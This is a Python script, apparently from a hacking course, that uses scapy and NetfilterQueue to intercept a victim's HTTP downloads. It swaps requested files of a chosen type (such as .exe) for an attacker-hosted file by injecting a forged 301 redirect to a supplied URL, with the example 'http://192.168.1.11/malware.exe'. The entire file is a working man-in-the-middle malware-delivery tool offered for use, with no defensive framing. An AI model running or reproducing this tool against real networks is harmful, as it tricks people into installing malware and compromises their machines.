import scapy.all as scapy
from netfilterqueue import NetfilterQueue
from optparse import OptionParser

ack_list = []
def taking_args():
    parser = OptionParser()
    parser.add_option('-m', '--malacious-file', dest='malaciousFile', help='Enter Malacious file url (eg: -mf http://192.168.1.11/malware.exe')
    parser.add_option('-f', '--file-type', dest='fileType', help='Add file type which you want to replece on download (Eg: -f exe')
    (options, arguments) = parser.parse_args()
    if(options.malaciousFile and options.fileType):
        return parser.parse_args()
    else:
        print('[-] You forgot to provide valid args\nUse -h or --help for help')
        exit()
(options, args) = taking_args()
link = options.malaciousFile
type = options.fileType

def changing_load(packet, ModifiedLoad):
    packet[scapy.Raw].load = ModifiedLoad
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def file_intercept(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if(scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP)):
        if(scapy_packet[scapy.TCP].dport == 80):
            if('.'+type in str(scapy_packet[scapy.Raw].load)):
                print('[+] '+type+' Request')
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif(scapy_packet[scapy.TCP].sport == 80):
            if(scapy_packet[scapy.TCP].seq in ack_list):
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print('[+] Replacing '+type+' file')
                modified_packet = changing_load(scapy_packet, 'HTTP/1.1 301 Moved Permanently\nLocation: '+link+'\n\n')

            
                packet.set_payload(bytes(modified_packet))
    packet.accept()






nfqueue = NetfilterQueue()
print('Waiting for Target to Download.....')
nfqueue.bind(0, file_intercept)
nfqueue.run()
